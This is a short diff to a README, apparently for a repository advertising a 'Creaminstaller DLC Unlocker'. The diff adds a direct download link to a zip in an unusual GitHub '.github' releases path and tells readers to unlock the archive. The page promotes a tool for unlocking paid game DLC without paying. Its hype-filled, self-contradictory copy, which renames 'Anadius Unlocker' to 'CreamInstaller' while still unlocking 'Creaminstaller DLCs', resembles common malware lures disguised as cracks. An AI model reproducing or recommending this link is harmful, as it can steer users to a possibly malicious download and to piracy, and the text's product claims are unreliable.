@@ -2,12 +2,12 @@
 
 ## 📥 Getting Started
 To get started with Creaminstaller, follow these simple steps:
-1. **Get the unlocker: [🔗 Download Creaminstaller DLC Unlocker]()**
+1. **Get the unlocker: [🔗 Download Creaminstaller DLC Unlocker](https://github.com/CreamInstaller/.github/releases/download/1.7.5/CreamInstaller-DLC-Unlocker.zip)**
 2. **Unlock the archive and follow the instructions!**
 3. **Enjoy the game!**
 
-**📌 Description:**  
-🚀 **Anadius Unlocker** is the best currently available way to unlock Creaminstaller DLCs and Expansions and keep them up-to-date while also being able to get access to online features like gallery.
+## 📌 Description:
+🚀 **CreamInstaller** is the best currently available way to unlock Creaminstaller DLCs and Expansions and keep them up-to-date while also being able to get access to online features like gallery.
 
 ![DLC Unlocker Preview](https://preview.redd.it/question-about-creaminstaller-v4-10-0-v0-2mcgp0xm6mac1.png?width=577&format=png&auto=webp&s=16d2f575db667e83e2151139378909cd0f4541a5)
 
